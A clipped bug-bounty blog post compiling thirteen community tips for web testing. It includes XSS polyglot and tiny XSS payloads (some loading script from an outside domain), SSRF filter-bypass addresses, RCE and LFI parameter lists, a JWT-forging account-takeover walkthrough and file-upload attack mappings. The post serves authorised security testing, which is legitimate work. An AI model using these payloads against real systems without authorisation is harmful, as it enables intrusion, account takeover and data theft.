---
title: Bug Bounty Tips #3
url: https://www.infosecmatter.com/bug-bounty-tips-3-jul-21/
clipped_at: 2024-03-13 13:53:54
category: default
tags: 
 - www.infosecmatter.com
---


# Bug Bounty Tips #3

Here’s another dose of [bug bounty tips](https://www.infosecmatter.com/bug-bounty-tips/) from the bug hunting community on Twitter, sharing knowledge for all of us to help us find more vulnerabilities and collect bug bounties.

This is the 3rd part and in each part we are publishing 10 or more tips. Here we go..

## 1\. HTTP Host header: localhost

By [@hacker\_](https://twitter.com/hacker_) (compiled by [@intigriti](https://twitter.com/intigriti))  
Source: [link](https://twitter.com/intigriti/status/1284461734108057601)

Want to find critical bugs by changing a single header? Do just like [@hacker\_](https://twitter.com/hacker_) and set the ‘Host’ header to ‘localhost’ in your next directory bruteforce, the results might be surprising! You might gain access to:

-   Special features
-   Internal endpoints
-   Config files, SSL keys
-   Directory listing, …

We can even take this a step further and try to identify all sites that are hosted on the target web server by performing virtual host enumeration. How to enumerate virtual hosts? We could use tools such as these:

-   [https://github.com/ffuf/ffuf](https://github.com/ffuf/ffuf)
-   [https://nmap.org/nsedoc/scripts/http-vhosts.html](https://nmap.org/nsedoc/scripts/http-vhosts.html)
-   [https://github.com/jobertabma/virtual-host-discovery](https://github.com/jobertabma/virtual-host-discovery)

Note that we could also use curl or wget:

```bash
curl -v -H "Host: localhost" https://target/
wget -d --header="Host: localhost" https://target/
```

## 2\. Javascript polyglot for XSS

By [@s0md3v](https://twitter.com/s0md3v) (tweeted by [@lutfumertcey](https://twitter.com/lutfumertcey))  
Source: [link](https://twitter.com/lutfumertceylan/status/1284078795754999808)

How can you make a Javascript Polyglot for XSS? Check this super useful inforgraphics made by [@s0md3v](https://twitter.com/s0md3v):

![Javascript polyglot for XSS](assets/1710309234-faf721403a9af5911900303fb06010c4.jpg)

Here’s an ASCII version:

```bash
-->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>

-->          Breaks comment context
'            Breaks Attribute Context
"            Breaks attribute context
/>           Closes an open tag
</sCript>    Breaks JS context
<deTailS     A less known tag
open         To eliminate user interaction required for execution
x            Dummy attribute
">"          Mimics the closing of tag
ontoggle     A less known event handler
()           Parentheses around the function
co\u006efirm "confirm" function with Unicoded 'n'
``           Backticks instead of ()
```

Note that we may only need a certain portion of the polyglot, depending on our situation. Do not copy & paste blindly.

## 3\. Find related domains via favicon hash

By [@m4ll0k2](https://twitter.com/m4ll0k2)  
Source: [link](https://twitter.com/m4ll0k2/status/1279402680704806912)

Did you know that we can find related domains and sub domains to our target by looking for the same favicon icon hash? This is exactly what [favihash.py](https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/favihash.py) tool made by [@m4ll0k2](https://twitter.com/m4ll0k2) does. Here’s how to use it:

```bash
cat my_targets.txt | xargs -I %% bash -c 'echo "http://%%/favicon.ico"' > targets.txt
python3 favihash.py -f https://target/favicon.ico -t targets.txt -s
```

![favihash - discover domains with the same favicon icon hash](assets/1710309234-caf5968f54c1b01be54669aacf98448a.jpg)

Simply said, favihash will allow us to discover domains that have the same favicon icon hash as our target. Grab the tool from here:

-   [https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/favihash.py](https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/favihash.py)

## 4\. Account takeover by JWT token forging

By [@\_mkahmad](https://twitter.com/_mkahmad)  
Source: [link](https://twitter.com/_mkahmad/status/1268099950828589058)

Here’s how [@\_mkahmad](https://twitter.com/_mkahmad) was able to takeover an account by forging JWT tokens:

-   Decompiled APK and found API endpoint  
    \>> /signup/users/generateJwtToken
-   Sent to repeater (Burp Suite)
-   Added Auth-Token header in the request
-   Used my account’s auth token in the header
-   Removed the signature part –> It works !!
-   Changed user id in token using JOSEPH in Burp Suite
-   Got other user’s JWT token in the response
-   Account takeover!

Note that all other endpoints were properly checking the JWK token.

## 5\. Top 25 remote code execution (RCE) parameters

By [@trbughunters](https://twitter.com/trbughunters)  
Source: [link](https://twitter.com/trbughunters/status/1283133356922884096)

Here are the top 25 parameters that could be vulnerable to code injection and similar RCE vulnerabilities:

```bash
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```

Take notice anytime you see any of these parameters. Chances are that you may be able to inject code in them in some way.

## 6\. SSRF payloads to bypass WAF

By [@manas\_hunter](https://twitter.com/manas_hunter)  
Source: [link](https://twitter.com/manas_hunter/status/1282743891154792449)

Here are 5 payloads that could be used for bypassing defenses when it comes to SSRF (Server-Side Request Forgery):

1) Bypass SSRF with CIDR:

```bash
http://127.127.127.127
http://127.0.0.0
```

2) Bypass using rare address:

```bash
http://127.1
http://0
```

3) Bypass using tricks combination:

```bash
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib : 3.3.3.3
```

4) Bypass against a weak parser:

```bash
http://127.1.1.1:80\@127.2.2.2:80/
```

5) Bypass localhost with \[::\]:

```bash
http://[::]:80/
http://0000::1:80/
```

Let’s remind ourselves what SSRF vulnerabilities are and what can we do with them. In general, SSRF allows us to:

-   Access services on the loopback interface running on the remote server
-   Scan internal network an potentially interact with the discovered services
-   Read local files on the server using file:// protocol handler
-   Move laterally / pivoting into the internal environment

How to find SSRF? When the target web application allows us to access external resources, e.g. a profile image loaded from external URL (running on a 3rd party website), we can try to load internal resources accessible by the vulnerable web application. For example:

1.  We discover that the following URL works:  
    `https://example.com:8000/page?user=&link=https://127.0.0.1:8000`
2.  We can then run Intruder attack (Burp Suite) trying different ports, effectively doing a port scan of the host
3.  We can also try to scan private IPs such as 192.168.x.x and discover alive IPs in the internal network

## 7\. Find subdomains using RapidDNS

By [@Verry\_\_D](https://twitter.com/Verry__D)  
Source: [link](https://twitter.com/Verry__D/status/1282293265597779968)

Add this small function into your .bash\_profile to quickly find subdomains using [RapidDNS](https://rapiddns.io/) API:

```bash
rapiddns(){
curl -s "https://rapiddns.io/subdomain/$1?full=1" \
 | grep -oP '_blank">\K[^<]*' \
 | grep -v http \
 | sort -u
}
```

We can then use it like this:

```bash
rapiddns target.com
```

![RapidDNS subdomain enumeration using bash function](assets/1710309234-646e6f86ed4062bafb5c7ba00a9323ff.jpg)

Very nice and quick.

## 8\. Top 10 what can you reach in case you uploaded..

By [@SalahHasoneh1](https://twitter.com/SalahHasoneh1)  
Source: [link](https://twitter.com/SalahHasoneh1/status/1281274120395685889)

Here’s a top 10 list of things that you can achieve by uploading:

1.  **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2.  **SVG**: Stored XSS / SSRF / XXE
3.  **GIF**: Stored XSS / SSRF
4.  **CSV**: CSV injection
5.  **XML**: XXE
6.  **AVI**: LFI / SSRF
7.  **HTML / JS** : HTML injection / XSS / Open redirect
8.  **PNG / JPEG**: Pixel flood attack (DoS)
9.  **ZIP**: RCE via LFI / DoS
10.  **PDF / PPTX**: SSRF / BLIND XXE

## 9\. Tiny minimalistic XSS payloads

By [@terjanq](https://twitter.com/terjanq)  
Source: [link](https://twitter.com/terjanq/status/1281371112060968964)

Here’s collection of tiny XSS payloads made by [@terjanq](https://twitter.com/terjanq):

```bash
<!-- If number of iframes on the page is constant -->
<iframe/onload=src=top[0].name+/\Ǌ.₨?/>

<!-- If number of iframes on the page is random -->
<iframe/onload=src=contentWindow.name+/\Ǌ.₨?/>

<!-- If unsafe-inline is disabled in CSP and external scripts allowed -->
<iframe/srcdoc="<script/src=//Ǌ.₨></script>">

<!-- Just a casual script -->
<script/src=//Ǌ.₨></script>

<!-- If you control the name of the window -->
<iframe/onload=src=top.name>

<!-- If you control the name, will work on Firefox in any context, will fail in chromium in DOM -->
<svg/onload=eval(name)>

<!-- If you control the URL -->
<svg/onload=eval(`'`+URL)>
```

Note that some of these XSS payloads contain ‘Ǌ.₨’ unicode string. This is a domain name (nj.rs) currently owned by [@terjanq](https://twitter.com/terjanq) with a web server serving a PoC code that would trigger an alert in an XSS condition:

![javascript alert code on nj.rs](assets/1710309234-920c44eaa304891d01d4b8703c3b3073.jpg)

This keeps the XSS payloads really tiny.

For more XSS payloads and the DEMO page, check out his designated Github repository:

-   [https://github.com/terjanq/Tiny-XSS-Payloads](https://github.com/terjanq/Tiny-XSS-Payloads)

## 10\. Top 25 local file inclusion (LFI) parameters

By [@trbughunters](https://twitter.com/trbughunters)  
Source: [link](https://twitter.com/trbughunters/status/1279768631845494787)

Here’s list of top 25 parameters that could be vulnerable to local file inclusion (LFI) vulnerabilities:

```bash
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```

Take notice anytime you see any of these parameters. Chances are that you may find LFI vulnerabilities.

## 11\. Fuzz list for GIT and SVN files

By [@TobiunddasMoe](https://twitter.com/TobiunddasMoe)  
Source: [link](https://twitter.com/TobiunddasMoe/status/1274043016366481409)

Here’s a quick tip to find git and svn files using this small but quick fuzz list:

```bash
/.git
/.git-rewrite
/.git/HEAD
/.git/config
/.git/index
/.git/logs/
/.git_release
/.gitattributes
/.gitconfig
/.gitignore
/.gitk
/.gitkeep
/.gitmodules
/.gitreview
/.svn
/.svn/entries
/.svnignore
```

We may find some interesting information in them.

## 12\. Mirror a web directory structure

By [@2RS3C](https://twitter.com/2RS3C)  
Source: [link](https://twitter.com/2RS3C/status/1277861125556768769)

Found a directory listing similar to this?

![Use wget to recursively mirror the directory structure](assets/1710309234-ac23be74cdb83e910daf02719ca191f6.jpg)

Use the following ‘wget’ command to recursively fetch all the files (+structure) to your machine:

```bash
wget -r --no-parent target.com/dir
```

Now you can view the structure, search and grep in files.

Pro tip: How to find a directory listing on your target? A directory listing is a web server misconfiguration which we can identify using these:

-   Google dorks
-   [Shodan](https://www.shodan.io/) search engine
-   [https://github.com/ffuf/ffuf](https://github.com/ffuf/ffuf)
-   [https://github.com/maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)

## 13\. Find sensitive information with AlienVault OTX

By [@mariusshoratau](https://twitter.com/mariusshoratau)  
Source: [link](https://twitter.com/mariusshoratau/status/1279522645344731138https://twitter.com/mariusshoratau/status/1279522645344731138)

Have you heard about AlienVault [Open Threat Exchange](https://otx.alienvault.com/) (OTX) ? You can use it to get easy bounties. Here’s how:

1.  Go to https://otx.alienvault.com/indicator/domain/<TARGET>
2.  Replace <TARGET> with your target.
3.  Scroll down to the “Associated Urls” section.
4.  Using AlientVault OTX you may find URLs that disclose sensitive information about other users (e.g. receipts), auth tokens, IDORs, interesting parameters / files, and many other gems.

Note that there is also API available at:

-   https://otx.alienvault.com/api/v1/indicators/domain/<TARGET>/url\_list?limit=100&page=1

So, here’s what we can do:

```bash
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/<TARGET>/url_list?limit=100&page=1" | jq
```

![Using AlienVault OTX API with curl / wget](assets/1710309234-818d54479c84e7c5c487d03145e0c317.jpg)

To get only the list of URLs, we could do this:

```bash
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/<TARGET>/url_list?limit=100&page=1" | jq -r '.url_list[].url'
```

![Using AlienVault OTX API to get list of associated URLs](assets/1710309234-ac90570a520d386bd80d2e8dee7e30e9.jpg)

Nice and neat!

## Conclusion

That’s it for this part of the [bug bounty tips](https://www.infosecmatter.com/bug-bounty-tips/).

Big thanks to all the authors for sharing their tips:

-   [@terjanq](https://twitter.com/terjanq)
-   [@hacker\_](https://twitter.com/hacker_)
-   [@intigriti](https://twitter.com/intigriti)
-   [@s0md3v](https://twitter.com/s0md3v)
-   [@m4ll0k2](https://twitter.com/m4ll0k2)
-   [@Verry\_\_D](https://twitter.com/Verry__D)
-   [@lutfumertcey](https://twitter.com/lutfumertcey)
-   [@trbughunters](https://twitter.com/trbughunters)
-   [@\_mkahmad](https://twitter.com/_mkahmad)
-   [@manas\_hunter](https://twitter.com/manas_hunter)
-   [@SalahHasoneh1](https://twitter.com/SalahHasoneh1)
-   [@TobiunddasMoe](https://twitter.com/TobiunddasMoe)
-   [@mariusshoratau](https://twitter.com/mariusshoratau)

Make sure to follow them on Twitter to stay ahead of the bug bounty game.
